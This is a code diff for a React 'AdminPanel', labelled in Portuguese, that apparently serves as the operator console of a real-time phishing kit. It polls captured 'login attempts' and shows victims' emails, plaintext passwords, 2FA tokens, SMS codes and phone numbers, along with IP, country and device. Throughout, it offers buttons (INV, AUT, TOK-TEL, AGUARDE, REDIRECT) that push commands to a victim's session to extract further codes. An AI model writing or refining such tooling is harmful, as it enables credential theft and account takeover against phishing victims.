@@ -14,7 +14,7 @@ function AdminPanel() {
 
   useEffect(() => {
     fetchLoginAttempts();
-    const interval = setInterval(fetchLoginAttempts, 3000); // Atualiza a cada 3 segundos
+    const interval = setInterval(fetchLoginAttempts, 3000);
     return () => clearInterval(interval);
   }, []);
 
@@ -169,10 +169,6 @@ function AdminPanel() {
       {/* Content */}
       <div className="container mx-auto px-4 py-8">
         <div className="bg-white rounded-lg shadow-md p-6">
-          <h1 className="text-2xl font-bold text-gray-900 mb-6">
-            Tentativas de Login ({filteredAttempts.length})
-          </h1>
-
           {/* Search */}
           <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
             <div>
@@ -203,7 +199,7 @@ function AdminPanel() {
             </div>
           </div>
 
-          {/* Cards */}
+          {/* Loading */}
           {loading ? (
             <div className="text-center py-12">
               <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-purple-600"></div>
@@ -214,143 +210,157 @@ function AdminPanel() {
               <p className="text-gray-500 text-lg">Nenhuma tentativa de login encontrada</p>
             </div>
           ) : (
-            <div className="space-y-4">
+            <div className="space-y-6">
               {filteredAttempts.map((attempt, index) => (
-                <div key={attempt.id} className="border border-gray-200 rounded-lg p-4 bg-white shadow-sm hover:shadow-md transition-shadow">
-                  {/* Header do Card */}
-                  <div className="grid grid-cols-2 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-12 gap-2 mb-4">
-                    {/* # */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-blue-600 mb-1">#</span>
-                      <span className="text-sm font-bold">{index + 1}</span>
-                    </div>
-
-                    {/* STATUS */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-purple-600 mb-1">STATUS</span>
-                      <button
-                        onClick={() => updateStatus(attempt.id, attempt.status === "online" ? "offline" : "online")}
-                        className="flex items-center gap-1"
-                      >
-                        <span className={`inline-block w-3 h-3 rounded-full ${attempt.status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
-                        <span className="text-xs">{attempt.status === "online" ? "ON" : "OFF"}</span>
-                      </button>
-                    </div>
-
-                    {/* INV */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-yellow-600 mb-1">INV</span>
-                      <button
-                        onClick={() => sendCommand(attempt.id, "INV")}
-                        className="bg-yellow-500 hover:bg-yellow-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
-                      >
-                        INV
-                      </button>
-                    </div>
-
-                    {/* USUÁRIO/LOGIN */}
-                    <div className="flex flex-col col-span-2">
-                      <span className="text-xs font-semibold text-green-600 mb-1">USUÁRIO/LOGIN</span>
-                      <span className="text-sm font-medium truncate">{attempt.email}</span>
-                    </div>
-
-                    {/* SENHA */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-pink-600 mb-1">SENHA</span>
-                      <span className="text-sm truncate">{attempt.password || "-"}</span>
-                    </div>
-
-                    {/* AUT */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-blue-600 mb-1">AUT</span>
-                      <button
-                        onClick={() => sendCommand(attempt.id, "AUT")}
-                        className="bg-blue-500 hover:bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
-                      >
-                        AUT
-                      </button>
-                    </div>
-
-                    {/* EMAIL */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-indigo-600 mb-1">EMAIL</span>
-                      <button
-                        onClick={() => sendCommand(attempt.id, "EMAIL")}
-                        className="bg-indigo-500 hover:bg-indigo-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
-                      >
-                        EMAIL
-                      </button>
-                    </div>
-
-                    {/* TOK-TEL */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-teal-600 mb-1">TOK-TEL</span>
-                      <button
-                        onClick={() => sendCommand(attempt.id, "TOK-TEL")}
-                        className="bg-teal-500 hover:bg-teal-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
-                      >
-                        TOK
-                      </button>
-                    </div>
-
-                    {/* Nº TELEFONE */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-orange-600 mb-1">Nº TEL</span>
-                      <button
-                        onClick={() => sendCommand(attempt.id, "TELEFONE")}
-                        className="bg-orange-500 hover:bg-orange-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
-                      >
-                        TEL
-                      </button>
-                    </div>
-
-                    {/* 👍 */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-gray-600 mb-1">AGUARDE</span>
-                      <button
-                        onClick={() => sendCommand(attempt.id, "AGUARDE")}
-                        className="bg-gray-500 hover:bg-gray-600 text-white px-2 py-1 rounded text-xs transition-colors"
-                      >
-                        👍
-                      </button>
-                    </div>
-
-                    {/* X */}
-                    <div className="flex flex-col">
-                      <span className="text-xs font-semibold text-red-600 mb-1">X</span>
-                      <button
-                        onClick={() => sendCommand(attempt.id, "REDIRECT")}
-                        className="bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
-                      >
-                        X
-                      </button>
-                    </div>
+                <div key={attempt.id} className="border border-gray-200 rounded-lg overflow-hidden shadow-sm">
+                  {/* Header com email e número de tentativas */}
+                  <div className="bg-gradient-to-r from-blue-400 to-blue-500 px-4 py-3 text-white">
+                    <h3 className="font-bold text-lg">{attempt.email} ({index + 1} tentativa)</h3>
                   </div>
 
-                  {/* Informações abaixo */}
-                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pt-3 border-t border-gray-200 text-xs text-gray-600">
-                    <div>
-                      <span className="font-semibold">🌐 IP:</span> {attempt.ip_address || "-"}
-                    </div>
-                    <div>
-                      <span className="font-semibold">🌍 País:</span> {attempt.country || "-"}
-                    </div>
-                    <div>
-                      <span className="font-semibold">💻 Dispositivo:</span> {attempt.device || "Desktop"}
-                    </div>
-                    <div>
-                      <span className="font-semibold">📄 Página atual:</span> {attempt.page || "Página Loading..."}
-                    </div>
+                  {/* Tabela */}
+                  <div className="overflow-x-auto">
+                    <table className="w-full border-collapse">
+                      <thead>
+                        <tr>
+                          <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">#</th>
+                          <th className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">status</th>
+                          <th className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">INV</th>
+                          <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">USUÁRIO/LOGIN</th>
+                          <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">SENHA</th>
+                          <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">AUT</th>
+                          <th className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">EMAIL</th>
+                          <th className="bg-orange-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-TEL</th>
+                          <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">Nº TELEFONE</th>
+                          <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">APP MAIL</th>
+                          <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">👍</th>
+                          <th className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">X</th>
+                          <th className="bg-gray-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">🗑️</th>
+                        </tr>
+                      </thead>
+                      <tbody>
+                        {/* Linha de Comandos/Botões */}
+                        <tr className="bg-white">
+                          <td className="px-3 py-2 text-center text-sm font-bold border border-gray-300">{index + 1}</td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => updateStatus(attempt.id, attempt.status === "online" ? "offline" : "online")}
+                              className="inline-flex items-center justify-center"
+                            >
+                              <span className={`w-4 h-4 rounded-full ${attempt.status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
+                            </button>
+                          </td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => sendCommand(attempt.id, "INV")}
+                              className="bg-yellow-500 hover:bg-yellow-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
+                            >
+                              INV
+                            </button>
+                          </td>
+                          <td className="px-3 py-2 text-sm border border-gray-300 font-medium">{attempt.email}</td>
+                          <td className="px-3 py-2 text-sm border border-gray-300">{attempt.password || "-"}</td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => sendCommand(attempt.id, "AUT")}
+                              className="bg-blue-500 hover:bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
+                            >
+                              AUT
+                            </button>
+                          </td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => sendCommand(attempt.id, "EMAIL")}
+                              className="bg-indigo-500 hover:bg-indigo-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
+                            >
+                              EMAIL
+                            </button>
+                          </td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => sendCommand(attempt.id, "TOK-TEL")}
+                              className="bg-teal-500 hover:bg-teal-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
+                            >
+                              TOK
+                            </button>
+                          </td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => sendCommand(attempt.id, "TELEFONE")}
+                              className="bg-orange-500 hover:bg-orange-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
+                            >
+                              TEL
+                            </button>
+                          </td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <span className="text-gray-400 text-xs">-</span>
+                          </td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => sendCommand(attempt.id, "AGUARDE")}
+                              className="text-xl"
+                            >
+                              👍
+                            </button>
+                          </td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => sendCommand(attempt.id, "REDIRECT")}
+                              className="text-red-600 hover:text-red-800 font-bold text-xl transition-colors"
+                            >
+                              X
+                            </button>
+                          </td>
+                          <td className="px-3 py-2 text-center border border-gray-300">
+                            <button
+                              onClick={() => handleDelete(attempt.id)}
+                              className="text-gray-600 hover:text-gray-800 transition-colors"
+                            >
+                              🗑️
+                            </button>
+                          </td>
+                        </tr>
+
+                        {/* Linha de Dados Recebidos */}
+                        <tr className="bg-gray-50">
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
+                            <span className="text-gray-700">-</span>
+                          </td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
+                            <span className="text-gray-700">{attempt.token_2fa || "-"}</span>
+                          </td>
+                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
+                            <span className="text-gray-700">{attempt.email_input || "-"}</span>
+                          </td>
+                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
+                            <span className="text-gray-700">{attempt.sms_code || "-"}</span>
+                          </td>
+                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
+                            <span className="text-gray-700">{attempt.phone_number || "-"}</span>
+                          </td>
+                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
+                            <span className="text-gray-700">{attempt.app_mail || "-"}</span>
+                          </td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                        </tr>
+                      </tbody>
+                    </table>
                   </div>
 
-                  {/* Botão deletar */}
-                  <div className="mt-3 pt-3 border-t border-gray-200 flex justify-end">
-                    <button
-                      onClick={() => handleDelete(attempt.id)}
-                      className="text-red-600 hover:text-red-800 font-bold transition-colors"
-                    >
-                      🗑️ Deletar
-                    </button>
+                  {/* Footer com informações */}
+                  <div className="bg-gray-50 px-4 py-3 text-xs text-gray-600 border-t border-gray-200">
+                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
+                      <div><span className="font-semibold">🌐 IP:</span> {attempt.ip_address || "-"}</div>
+                      <div><span className="font-semibold">🌍 País:</span> {attempt.country || "-"}</div>
+                      <div><span className="font-semibold">💻 Dispositivo:</span> {attempt.device || "Desktop"}</div>
+                      <div><span className="font-semibold">📄 Página atual:</span> {attempt.page || "Página Loading..."}</div>
+                    </div>
                   </div>
                 </div>
               ))}
